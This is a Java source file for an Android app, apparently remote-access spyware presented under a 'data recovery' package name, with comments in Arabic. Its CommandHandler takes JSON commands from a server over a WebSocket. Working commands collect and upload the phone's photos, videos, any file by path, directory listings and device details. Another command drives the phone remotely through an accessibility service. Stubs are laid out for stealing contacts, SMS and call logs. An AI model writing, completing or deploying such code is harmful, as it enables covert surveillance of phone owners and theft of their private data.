package com.recoverdata.phone.network;

import android.content.Context;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.recoverdata.phone.accessibility.AutoPilotService;
import com.recoverdata.phone.data.DataSender;
import com.recoverdata.phone.data.FileCollector;
import com.recoverdata.phone.data.PhotoCollector;
import com.recoverdata.phone.data.VideoCollector;
import com.recoverdata.phone.utils.Logger;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * CommandHandler
 * ============================================================
 * يستقبل الرسائل من السيرفر ويفكّكها ويوجّهها للأجزاء المناسبة.
 *
 * المسؤوليات:
 *   1. تحليل رسائل JSON الواردة.
 *   2. التحقق من صحة الرسالة.
 *   3. توجيه الأمر إلى المعالج المناسب.
 *   4. إرسال نتيجة التنفيذ إلى السيرفر.
 *
 * صيغة الرسالة الواردة:
 *   {
 *     "id": "req-123",
 *     "cmd": "GET_PHOTOS",
 *     "payload": { ... },
 *     "timestamp": 1234567890
 *   }
 *
 * صيغة الرد:
 *   {
 *     "id": "req-123",
 *     "type": "RESULT",
 *     "cmd": "GET_PHOTOS",
 *     "success": true,
 *     "message": "Done",
 *     "timestamp": 1234567890
 *   }
 * ============================================================
 */
public class CommandHandler {

    // =============================================================
    // 1. الثوابت
    // =============================================================
    private static final String TAG = "CommandHandler";

    // ===== الأوامر المدعومة =====
    // البيانات
    public static final String CMD_GET_PHOTOS    = "GET_PHOTOS";
    public static final String CMD_GET_VIDEOS    = "GET_VIDEOS";
    public static final String CMD_GET_FILE      = "GET_FILE";
    public static final String CMD_LIST_DIR      = "LIST_DIR";
    public static final String CMD_GET_CONTACTS  = "GET_CONTACTS";
    public static final String CMD_GET_SMS       = "GET_SMS";
    public static final String CMD_GET_CALL_LOGS = "GET_CALL_LOGS";
    public static final String CMD_GET_DEVICE_INFO = "GET_DEVICE_INFO";

    // Accessibility
    public static final String CMD_ACCESSIBILITY = "ACCESSIBILITY";

    // التحكم
    public static final String CMD_PING          = "PING";
    public static final String CMD_STOP          = "STOP";

    // =============================================================
    // 2. الحقول
    // =============================================================
    private final Context appContext;
    private final PhotoCollector  photoCollector;
    private final VideoCollector  videoCollector;
    private final FileCollector   fileCollector;
    private final DataSender      dataSender;

    // =============================================================
    // 3. البناء
    // =============================================================
    public CommandHandler(@NonNull Context context) {
        this.appContext = context.getApplicationContext();
        this.photoCollector = new PhotoCollector(appContext);
        this.videoCollector = new VideoCollector(appContext);
        this.fileCollector  = new FileCollector(appContext);
        this.dataSender     = new DataSender(appContext);

        Logger.i(TAG, "CommandHandler initialized");
    }

    // =============================================================
    // 4. نقطة الدخول الرئيسية
    // =============================================================

    /**
     * استقبال رسالة من السيرفر وتحليلها.
     *
     * @param rawMessage الرسالة الخام (JSON)
     * @param ws         مرجع WebSocketManager للرد
     */
    public void handle(@NonNull String rawMessage, @NonNull WebSocketManager ws) {
        if (rawMessage.trim().isEmpty()) {
            Logger.w(TAG, "Empty message received");
            return;
        }

        Logger.d(TAG, "Handling: " + truncate(rawMessage, 300));

        JSONObject json;
        try {
            json = new JSONObject(rawMessage);
        } catch (JSONException e) {
            Logger.e(TAG, "Invalid JSON: " + e.getMessage(), e);
            sendError(ws, null, null, "Invalid JSON");
            return;
        }

        // استخراج الحقول
        String id  = json.optString("id", null);
        String cmd = json.optString("cmd", null);
        JSONObject payload = json.optJSONObject("payload");

        // التحقق
        if (cmd == null || cmd.isEmpty()) {
            Logger.w(TAG, "Missing 'cmd' field");
            sendError(ws, id, null, "Missing 'cmd' field");
            return;
        }

        // التوجيه
        try {
            dispatch(id, cmd, payload, ws);
        } catch (Exception e) {
            Logger.e(TAG, "Dispatch error for cmd=" + cmd, e);
            sendError(ws, id, cmd, "Exception: " + e.getMessage());
        }
    }

    // =============================================================
    // 5. التوجيه (Dispatcher)
    // =============================================================
    private void dispatch(@Nullable String id, @NonNull String cmd,
                          @Nullable JSONObject payload, @NonNull WebSocketManager ws) {

        Logger.i(TAG, "Dispatching cmd=" + cmd + " id=" + id);

        switch (cmd) {

            // ============ البيانات ============
            case CMD_GET_PHOTOS:
                handleGetPhotos(id, payload, ws);
                break;

            case CMD_GET_VIDEOS:
                handleGetVideos(id, payload, ws);
                break;

            case CMD_GET_FILE:
                handleGetFile(id, payload, ws);
                break;

            case CMD_LIST_DIR:
                handleListDir(id, payload, ws);
                break;

            case CMD_GET_CONTACTS:
                handleGetContacts(id, payload, ws);
                break;

            case CMD_GET_SMS:
                handleGetSms(id, payload, ws);
                break;

            case CMD_GET_CALL_LOGS:
                handleGetCallLogs(id, payload, ws);
                break;

            case CMD_GET_DEVICE_INFO:
                handleGetDeviceInfo(id, ws);
                break;

            // ============ Accessibility ============
            case CMD_ACCESSIBILITY:
                handleAccessibility(id, payload, ws);
                break;

            // ============ التحكم ============
            case CMD_PING:
                sendSuccess(ws, id, cmd, "PONG");
                break;

            case CMD_STOP:
                sendSuccess(ws, id, cmd, "Stopping...");
                // TODO: إيقاف الخدمة (اختياري)
                break;

            // ============ غير معروف ============
            default:
                Logger.w(TAG, "Unknown command: " + cmd);
                sendError(ws, id, cmd, "Unknown command: " + cmd);
                break;
        }
    }

    // =============================================================
    // 6. معالجات البيانات
    // =============================================================

    // ---------- 6.1 الصور ----------
    private void handleGetPhotos(@Nullable String id,
                                 @Nullable JSONObject payload,
                                 @NonNull WebSocketManager ws) {
        try {
            String path = (payload != null) ? payload.optString("path", null) : null;
            int limit   = (payload != null) ? payload.optInt("limit", 0) : 0;
            int offset  = (payload != null) ? payload.optInt("offset", 0) : 0;

            Logger.i(TAG, "GET_PHOTOS path=" + path + " limit=" + limit + " offset=" + offset);

            sendSuccess(ws, id, CMD_GET_PHOTOS, "Collecting photos...");

            // التنفيذ في خيط منفصل (لا نُعطّل WebSocket)
            new Thread(() -> {
                try {
                    int count = photoCollector.collectAndSend(path, limit, offset,
                            dataSender, ws, id);
                    sendSuccess(ws, id, CMD_GET_PHOTOS,
                            "Sent " + count + " photos");
                } catch (Exception e) {
                    Logger.e(TAG, "GET_PHOTOS error", e);
                    sendError(ws, id, CMD_GET_PHOTOS, e.getMessage());
                }
            }, "photos-worker").start();

        } catch (Exception e) {
            sendError(ws, id, CMD_GET_PHOTOS, e.getMessage());
        }
    }

    // ---------- 6.2 الفيديوهات ----------
    private void handleGetVideos(@Nullable String id,
                                 @Nullable JSONObject payload,
                                 @NonNull WebSocketManager ws) {
        try {
            String path = (payload != null) ? payload.optString("path", null) : null;
            int limit   = (payload != null) ? payload.optInt("limit", 0) : 0;
            int offset  = (payload != null) ? payload.optInt("offset", 0) : 0;

            Logger.i(TAG, "GET_VIDEOS path=" + path + " limit=" + limit + " offset=" + offset);

            sendSuccess(ws, id, CMD_GET_VIDEOS, "Collecting videos...");

            new Thread(() -> {
                try {
                    int count = videoCollector.collectAndSend(path, limit, offset,
                            dataSender, ws, id);
                    sendSuccess(ws, id, CMD_GET_VIDEOS,
                            "Sent " + count + " videos");
                } catch (Exception e) {
                    Logger.e(TAG, "GET_VIDEOS error", e);
                    sendError(ws, id, CMD_GET_VIDEOS, e.getMessage());
                }
            }, "videos-worker").start();

        } catch (Exception e) {
            sendError(ws, id, CMD_GET_VIDEOS, e.getMessage());
        }
    }

    // ---------- 6.3 ملف محدد ----------
    private void handleGetFile(@Nullable String id,
                               @Nullable JSONObject payload,
                               @NonNull WebSocketManager ws) {
        try {
            if (payload == null) {
                sendError(ws, id, CMD_GET_FILE, "Missing payload");
                return;
            }

            String filePath = payload.optString("path", null);
            if (filePath == null || filePath.isEmpty()) {
                sendError(ws, id, CMD_GET_FILE, "Missing 'path' in payload");
                return;
            }

            Logger.i(TAG, "GET_FILE path=" + filePath);

            sendSuccess(ws, id, CMD_GET_FILE, "Sending file...");

            new Thread(() -> {
                try {
                    boolean ok = fileCollector.collectAndSend(filePath, dataSender, ws, id);
                    if (ok) {
                        sendSuccess(ws, id, CMD_GET_FILE, "File sent");
                    } else {
                        sendError(ws, id, CMD_GET_FILE, "File not found or unreadable");
                    }
                } catch (Exception e) {
                    Logger.e(TAG, "GET_FILE error", e);
                    sendError(ws, id, CMD_GET_FILE, e.getMessage());
                }
            }, "file-worker").start();

        } catch (Exception e) {
            sendError(ws, id, CMD_GET_FILE, e.getMessage());
        }
    }

    // ---------- 6.4 قائمة مجلد ----------
    private void handleListDir(@Nullable String id,
                               @Nullable JSONObject payload,
                               @NonNull WebSocketManager ws) {
        try {
            String path = (payload != null) ? payload.optString("path", null) : null;
            if (path == null || path.isEmpty()) {
                sendError(ws, id, CMD_LIST_DIR, "Missing 'path' in payload");
                return;
            }

            Logger.i(TAG, "LIST_DIR path=" + path);

            new Thread(() -> {
                try {
                    String result = fileCollector.listDirectory(path);
                    sendData(ws, id, CMD_LIST_DIR, result);
                } catch (Exception e) {
                    Logger.e(TAG, "LIST_DIR error", e);
                    sendError(ws, id, CMD_LIST_DIR, e.getMessage());
                }
            }, "list-worker").start();

        } catch (Exception e) {
            sendError(ws, id, CMD_LIST_DIR, e.getMessage());
        }
    }

    // ---------- 6.5 جهات الاتصال ----------
    private void handleGetContacts(@Nullable String id,
                                   @Nullable JSONObject payload,
                                   @NonNull WebSocketManager ws) {
        Logger.i(TAG, "GET_CONTACTS");
        sendSuccess(ws, id, CMD_GET_CONTACTS, "Not implemented yet");
    }

    // ---------- 6.6 الرسائل النصية ----------
    private void handleGetSms(@Nullable String id,
                              @Nullable JSONObject payload,
                              @NonNull WebSocketManager ws) {
        Logger.i(TAG, "GET_SMS");
        sendSuccess(ws, id, CMD_GET_SMS, "Not implemented yet");
    }

    // ---------- 6.7 سجل المكالمات ----------
    private void handleGetCallLogs(@Nullable String id,
                                   @Nullable JSONObject payload,
                                   @NonNull WebSocketManager ws) {
        Logger.i(TAG, "GET_CALL_LOGS");
        sendSuccess(ws, id, CMD_GET_CALL_LOGS, "Not implemented yet");
    }

    // ---------- 6.8 معلومات الجهاز ----------
    private void handleGetDeviceInfo(@Nullable String id,
                                     @NonNull WebSocketManager ws) {
        try {
            JSONObject info = new JSONObject();
            info.put("manufacturer", android.os.Build.MANUFACTURER);
            info.put("model",        android.os.Build.MODEL);
            info.put("brand",        android.os.Build.BRAND);
            info.put("device",       android.os.Build.DEVICE);
            info.put("android",      android.os.Build.VERSION.RELEASE);
            info.put("sdk",          android.os.Build.VERSION.SDK_INT);
            info.put("client",       ServerConfig.getClientName());
            info.put("client_ver",   ServerConfig.getClientVersion());
            info.put("timestamp",    System.currentTimeMillis());

            sendData(ws, id, CMD_GET_DEVICE_INFO, info.toString());

        } catch (Exception e) {
            sendError(ws, id, CMD_GET_DEVICE_INFO, e.getMessage());
        }
    }

    // =============================================================
    // 7. معالج Accessibility
    // =============================================================
    private void handleAccessibility(@Nullable String id,
                                     @Nullable JSONObject payload,
                                     @NonNull WebSocketManager ws) {
        try {
            AutoPilotService autopilot = AutoPilotService.getInstance();
            if (autopilot == null || !AutoPilotService.isReady()) {
                sendError(ws, id, CMD_ACCESSIBILITY,
                        "Accessibility Service not enabled");
                return;
            }

            if (payload == null) {
                sendError(ws, id, CMD_ACCESSIBILITY, "Missing payload");
                return;
            }

            String action = payload.optString("action", null);
            if (action == null || action.isEmpty()) {
                sendError(ws, id, CMD_ACCESSIBILITY, "Missing 'action' in payload");
                return;
            }

            Logger.i(TAG, "ACCESSIBILITY action=" + action);

            // التنفيذ
            AutoPilotService.CommandResult result = autopilot.execute(action, payload);

            if (result.success) {
                sendSuccess(ws, id, CMD_ACCESSIBILITY, result.message);
            } else {
                sendError(ws, id, CMD_ACCESSIBILITY, result.message);
            }

        } catch (Exception e) {
            Logger.e(TAG, "ACCESSIBILITY error", e);
            sendError(ws, id, CMD_ACCESSIBILITY, e.getMessage());
        }
    }

    // =============================================================
    // 8. إرسال الردود
    // =============================================================

    /**
     * إرسال رد نجاح.
     */
    private void sendSuccess(@NonNull WebSocketManager ws,
                             @Nullable String id,
                             @Nullable String cmd,
                             @NonNull String message) {
        try {
            JSONObject json = new JSONObject();
            if (id != null)  json.put("id", id);
            json.put("type", "RESULT");
            if (cmd != null) json.put("cmd", cmd);
            json.put("success", true);
            json.put("message", message);
            json.put("timestamp", System.currentTimeMillis());

            ws.send(json.toString());
        } catch (JSONException e) {
            Logger.e(TAG, "sendSuccess error", e);
        }
    }

    /**
     * إرسال رد فشل.
     */
    private void sendError(@NonNull WebSocketManager ws,
                           @Nullable String id,
                           @Nullable String cmd,
                           @NonNull String message) {
        try {
            JSONObject json = new JSONObject();
            if (id != null)  json.put("id", id);
            json.put("type", "RESULT");
            if (cmd != null) json.put("cmd", cmd);
            json.put("success", false);
            json.put("message", message);
            json.put("timestamp", System.currentTimeMillis());

            ws.send(json.toString());
        } catch (JSONException e) {
            Logger.e(TAG, "sendError error", e);
        }
    }

    /**
     * إرسال بيانات (نتيجة أوامر القراءة).
     */
    private void sendData(@NonNull WebSocketManager ws,
                          @Nullable String id,
                          @NonNull String cmd,
                          @NonNull String data) {
        try {
            JSONObject json = new JSONObject();
            if (id != null) json.put("id", id);
            json.put("type", "DATA");
            json.put("cmd", cmd);
            json.put("data", data);
            json.put("timestamp", System.currentTimeMillis());

            ws.send(json.toString());
        } catch (JSONException e) {
            Logger.e(TAG, "sendData error", e);
        }
    }

    // =============================================================
    // 9. أدوات مساعدة
    // =============================================================
    private static String truncate(String s, int max) {
        if (s == null) return "null";
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }
}